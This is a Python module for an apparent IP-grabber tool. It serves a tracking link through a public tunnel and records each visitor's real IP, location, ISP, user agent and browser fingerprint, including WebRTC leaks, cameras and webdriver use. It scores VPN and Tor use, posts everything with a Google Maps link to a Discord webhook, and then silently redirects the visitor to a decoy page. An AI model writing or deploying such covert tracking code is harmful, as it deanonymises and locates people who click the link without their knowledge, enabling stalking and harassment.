"""HTTP listener: records hits, scores risk and posts Discord webhooks."""

import json
import threading
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from . import geo, payload
from ..utils import tunnel

TARGET = ["http://localhost:8080/"]
PORT = [5000]
PUBLIC = [None]
WEBHOOK = [None]
STARTED = [False]
CFPROC = [None]

HITS = []
LOCK = threading.Lock()
STATS = {"tot": 0, "ok": 0, "ab": 0, "vpn": 0, "tor": 0, "bad": 0}
CC = {}
ISP = {}


def client_ip(handler):
    """Resolve the visitor address behind any proxy headers."""
    for hdr in ("CF-Connecting-IP", "X-Forwarded-For"):
        raw = handler.headers.get(hdr, "")
        if raw:
            return raw.split(",")[0].strip().replace("::ffff:", "")
    return handler.client_address[0].replace("::ffff:", "")


def risk(score, is_scan, args, fp):
    """Blend signals into a 0-100 risk score."""
    if is_scan:
        score = max(score, 80)
    ab = (args.get("ab", ["0"])[0] or "0").lower()
    if ab == "1":
        score = min(score + 10, 100)
    elif ab == "nojs":
        score = min(score + 25, 100)
    if args.get("wd", ["0"])[0] == "1" or fp.get("wd"):
        score = min(score + 40, 100)
    if fp.get("webrtc"):
        score = min(score + 15, 100)
    if fp.get("cams"):
        score = min(score + 5, 100)
    return score, ab == "1"


def record(ip, path, ua, referer, args, extra=None):
    """Store one hit and fire the outbound notification."""
    info = geo.geo(ip)
    os_name, browser = geo.parse_ua(ua)
    tags, _, score = geo.classify(info["isp"], info["org"], info["as"])
    if info["tor"]:
        tags.append("TOR")
        score = min(score + 60, 100)
    if info["proxy"]:
        tags.append("PX")
        score = min(score + 45, 100)
    if info["hosting"]:
        tags.append("HOST")
        score = min(score + 25, 100)
    is_scan, signature = geo.scanner(ua, path)
    fp = {}
    if args.get("fp", [""])[0]:
        try:
            fp = json.loads(urllib.parse.unquote(args["fp"][0]))
        except Exception:
            fp = {}
    score, ab = risk(score, is_scan, args, fp)

    where = [x for x in (info["cit"], info["rgn"], info["cty"]) if x != "?"]
    loc = ", ".join(where) or "?"
    stamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
    tag_text = " ".join(tags) if tags else "OK"

    with LOCK:
        HITS.append({
            "ip": ip, "loc": loc, "flag": geo.flag(info["cc"]),
            "cc": info["cc"], "isp": info["isp"], "as": info["as"],
            "ua": ua, "os": os_name, "br": browser, "ref": referer,
            "path": path, "ts": stamp, "risk": score, "tags": tag_text,
            "ab": ab, "bad": is_scan, "sig": signature, "fp": fp,
        })
        del HITS[:-200]
        STATS["tot"] += 1
        if ab:
            STATS["ab"] += 1
        if is_scan:
            STATS["bad"] += 1
        else:
            STATS["ok"] += 1
        if tags:
            STATS["vpn"] += 1
        if info["tor"]:
            STATS["tor"] += 1
        CC[info["cc"]] = CC.get(info["cc"], 0) + 1
        ISP[info["isp"][:20]] = ISP.get(info["isp"][:20], 0) + 1

    notify(ip, info, tags, score, ab, ua, os_name, browser, fp, stamp)
    return score


def notify(ip, info, tags, score, ab, ua, os_name, browser, fp, stamp):
    """Post a Discord embed for a single hit (best effort)."""
    if not WEBHOOK[0]:
        return
    flag = geo.flag(info["cc"])
    fields = [
        {"name": "IP", "value": "`%s`" % ip, "inline": True},
        {"name": "Loc", "value": "%s %s" % (flag, info["cit"]), "inline": True},
        {"name": "Risk", "value": "**%d/100**" % score, "inline": True},
        {"name": "Tags", "value": "**%s**" % (" ".join(tags) or "RES"),
         "inline": False},
        {"name": "AB", "value": "**%s**" % ("yes" if ab else "no"),
         "inline": True},
        {"name": "OS", "value": "%s/%s" % (os_name, browser), "inline": True},
        {"name": "ISP", "value": info["isp"][:100], "inline": True},
        {"name": "UA", "value": (ua[:500] or "?"), "inline": False},
    ]
    lines = payload.rows(fp)
    if lines:
        body = "".join("`%s`: %s\n" % (k, v) for k, v in lines[:20])
        fields.append({"name": "\U0001f52c Browser Fingerprint",
                       "value": body[:1024], "inline": False})
    if info["lat"]:
        fields.append({
            "name": "Map",
            "value": "[gmaps](https://www.google.com/maps?q=%s,%s)"
                     % (info["lat"], info["lon"]), "inline": False})
    colour = 0xFF3B30 if score >= 60 else 0xFFAA00 if score >= 25 else 0x00FF88
    embed = {
        "title": "hit", "description": "**%s** - %s %s" % (ip, flag,
                                                          info["cit"]),
        "color": colour, "fields": fields,
        "footer": {"text": "%s - swivel" % stamp},
    }
    try:
        req = urllib.request.Request(
            WEBHOOK[0],
            data=json.dumps({"embeds": [embed]}).encode(),
            headers={"Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0"},
            method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


class Handler(BaseHTTPRequestHandler):
    """Serves the fingerprint page and records every visit."""

    protocol_version = "HTTP/1.1"

    def do_GET(self):
        try:
            parts = urllib.parse.urlparse(self.path)
            path, args = parts.path, urllib.parse.parse_qs(parts.query)
            if path == "/favicon.ico":
                return self.empty()
            if path in ("/", ""):
                return self.body(payload.PAGE)
            self.hit(path, args)
        except Exception:
            pass

    def do_HEAD(self):
        try:
            self.send_response(302)
            self.send_header("Location", TARGET[0])
            self.send_header("Content-Length", "0")
            self.end_headers()
        except Exception:
            pass

    def empty(self):
        self.send_response(204)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def body(self, text):
        raw = text.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(raw)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(raw)

    def redirect(self):
        self.send_response(302)
        self.send_header("Location", TARGET[0])
        self.send_header("Content-Length", "0")
        self.end_headers()

    def hit(self, path, args):
        record(client_ip(self), path,
               self.headers.get("User-Agent", ""),
               self.headers.get("Referer", ""), args)
        try:
            self.redirect()
        except Exception:
            pass

    def log_message(self, *a):
        pass


def serve():
    """Bind the listener and open a public tunnel alongside it."""
    if STARTED[0]:
        tunnel.note("already running")
        return
    try:
        srv = ThreadingHTTPServer(("0.0.0.0", PORT[0]), Handler)
        srv.daemon_threads = True
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        STARTED[0] = True
        tunnel.note("server: port %d" % PORT[0])
    except Exception as e:
        tunnel.note("serve: " + str(e))
        return
    CFPROC[0] = tunnel.start(PORT[0], set_public)
    if CFPROC[0] is None:
        tunnel.note("tunnel failed - local only")


def set_public(url):
    PUBLIC[0] = url


def start(webhook, target):
    """Configure and boot the listener on a background thread."""
    WEBHOOK[0] = webhook or None
    TARGET[0] = target or "http://localhost:8080/"
    threading.Thread(target=serve, daemon=True).start()


def stop():
    if CFPROC[0]:
        try:
            CFPROC[0].terminate()
        except Exception:
            pass